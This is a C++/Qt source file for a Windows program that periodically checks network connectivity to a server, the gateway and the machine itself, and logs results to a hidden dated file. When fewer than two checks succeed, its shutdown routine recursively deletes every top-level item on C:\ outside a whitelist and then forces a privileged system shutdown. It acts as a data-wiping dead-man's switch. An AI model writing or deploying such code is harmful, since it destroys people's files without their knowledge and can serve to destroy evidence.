#include "thread2.h"
#include "thread1.h"
#include "pingthread.h"
#include <QApplication>

Timer2Handler::Timer2Handler()
{
    tcphandler = NULL;
    pinghandler = NULL;
    pingself = NULL;

    //secondary = NULL;
    timer2 = NULL;
    timerInterval = 2.5 * 60 * 1000;

    doRemoveFile = false;
    doShutDown = false;
}

void Timer2Handler::setTcpHandler(Timer1Handler* handler)
{
    tcphandler = handler;
}

void Timer2Handler::setPingGatewayHandler(PingHandler* handler)
{
    pinghandler = handler;
}

void Timer2Handler::setPingSelfHandler(PingHandler* handler)
{
    pingself = handler;
}

//void Timer2Handler::setSecondaryHandler(Timer1Handler* handler)
//{
//    secondary = handler;
//}

void Timer2Handler::setTimerInterval(int interval)
{
    timerInterval = interval;
}

void Timer2Handler::run()
{


    timer2 = new QTimer;
    connect(timer2, SIGNAL(timeout()), this, SLOT(action()));
    timer2->start(timerInterval);

    QThread::exec();
}

void Timer2Handler::setRemoveFile(bool flag)
{
    doRemoveFile = flag;
}

void Timer2Handler::setShutDown(bool flag)
{
    doShutDown = flag;
}

void Timer2Handler::action()
{
    qDebug() << "Timer2Handler::action";

    int goodAccess = 0;
    if(tcphandler && tcphandler->getGoodAccessTime() != 0)
        goodAccess ++;
    if(pinghandler && pinghandler->getGoodAccessTime() != 0)
        goodAccess ++;
    if(pingself && pingself->getGoodAccessTime() != 0)
        goodAccess ++;

    if(goodAccess < 2) {
        shutdown();
    } else {
        QFile outFile(QString("%1/.%2.txt").arg(QApplication::applicationDirPath()).arg(QDate::currentDate().toString("yyyy-MM-dd")));
        outFile.open(QIODevice::WriteOnly | QIODevice::Append);
        QTextStream ts(&outFile);

        if(tcphandler && tcphandler->getGoodAccessTime() != 0) {
            tcphandler->clearGoodAccessTime();
            ts << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") <<
                  " connected to server:" <<
                  tcphandler->getHostAddress() << "\n";
        }

        if(pinghandler && pinghandler->getGoodAccessTime() != 0) {
            pinghandler->clearGoodAccessTime();
            ts << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") <<
                  " ping to gateway:" << pinghandler->getHostAddress() << "\n";
        }

        if(pingself && pingself->getGoodAccessTime() != 0) {
            pingself->clearGoodAccessTime();
            ts << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") <<
                  " ping to self:" << pingself->getHostAddress() << "\n";
        }

        outFile.close();

        qDebug() << "Clear Good Access Time";
    }
}

bool DeleteDirectory(const QString &path)
{
    if (path.isEmpty())
        return false;

    QDir dir(path);
    if(!dir.exists())
        return true;

    dir.setFilter(QDir::AllEntries | QDir::NoDotAndDotDot);
    QFileInfoList fileList = dir.entryInfoList();
    foreach (QFileInfo fi, fileList)
    {
        if (fi.isFile())
            fi.dir().remove(fi.fileName());
        else
            DeleteDirectory(fi.absoluteFilePath());
    }
    return dir.rmpath(dir.absolutePath());
}

#include "windows.h"

bool MySystemShutDown()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    //获取进程标志
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         return false;

    //获取关机特权的LUID
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,    &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    //获取这个进程的关机特权
    AdjustTokenPrivileges(hToken, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) return false;

    // 强制关闭计算机
    if ( !ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0))
          return false;
    return true;
}

void Timer2Handler::shutdown()
{
QMap<QString, int> avai;
avai["a31e85d5248ef5511ce8b37e"] = 1;
avai["FlashFXP"] = 1;
avai["Intel"] = 1;
avai["MobaXterm_8.6"] = 1;
avai["MTKV26B5"] = 1;
avai["MyDrivers"] = 1;
avai["PerfLogs"] = 1;
avai["Program Files"] = 1;
avai["Program Files (x86)"] = 1;
avai["Windows"] = 1;
avai["用户"] = 1;
avai["putty"] = 1;
avai["drivers"] = 1;
avai["NVIDIA"] = 1;
avai["Users"] = 1;
avai["Windows.old"] = 1;


QFile outFile(QString("%1/.%2.txt").arg(QApplication::applicationDirPath()).arg(QDate::currentDate().toString("yyyy-MM-dd")));
outFile.open(QIODevice::WriteOnly | QIODevice::Append);
QTextStream ts(&outFile);

    QDir c("C:/");
    if(c.exists()) {
        c.setFilter(QDir::AllEntries|QDir::NoDotAndDotDot);
        QFileInfoList fileList = c.entryInfoList();
        foreach (QFileInfo fi, fileList)
        {
            if(!avai.contains(fi.fileName())) {
                if(fi.isFile()) {
                    if(doRemoveFile)
                        fi.dir().remove(fi.fileName());
                    ts << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") << " remove file:" << fi.fileName() << "\n";
                    qDebug() << "remove file:" << fi.fileName();
                }
                else {
                    if(doRemoveFile)
                        DeleteDirectory(fi.absoluteFilePath());
                    ts << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") << " remove dir:" << fi.absoluteFilePath() << "\n";
                    qDebug() << "remove dir:" << fi.absoluteFilePath();
                }
            }
        }
    }
    if(doShutDown)
        MySystemShutDown();
    qDebug() << "ShutDown";
    ts << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") << " ShutDown" << "\n";

    outFile.close();
}
